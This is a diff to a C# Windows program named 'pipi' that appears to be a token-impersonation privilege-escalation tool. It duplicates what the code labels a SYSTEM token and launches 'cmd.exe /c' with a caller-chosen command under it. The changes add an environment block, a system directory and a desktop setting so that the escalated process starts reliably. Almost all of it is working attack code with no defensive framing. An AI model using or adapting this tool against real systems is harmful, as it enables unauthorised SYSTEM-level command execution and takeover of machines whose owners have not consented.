@@ -4,7 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Runtime.InteropServices;
-
+using System.Security.Principal;
 
 namespace pipi
 {
@@ -39,6 +39,13 @@ namespace pipi
         public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
         [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)] 
         public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool RevertToSelf();
+        [DllImport("kernel32.dll")]
+        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
+        [DllImport("userenv.dll", SetLastError = true)]
+        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
+        
         static void Main(string[] args)
         {
             if (args.Length == 0) { 
@@ -63,10 +70,20 @@ namespace pipi
             Console.WriteLine(@"Found sid {0}", sidstr);
             IntPtr hSystemToken = IntPtr.Zero;
             DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
+            
+            StringBuilder sbSystemDir = new StringBuilder(256);
+            uint res1 = GetSystemDirectory(sbSystemDir, 256);IntPtr env = IntPtr.Zero;
+            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);
+            String name = WindowsIdentity.GetCurrent().Name;
+            Console.WriteLine("Impersonated user is: " + name);
+            RevertToSelf();
+            
+            
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             STARTUPINFO si = new STARTUPINFO(); 
             si.cb = Marshal.SizeOf(si); 
-            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe /c "+command, 0, IntPtr.Zero, null, ref si, out pi);
+            si.LpDesktop = "WinSta0\\Default";
+            CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe /c "+command, CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
         }
     }
 }
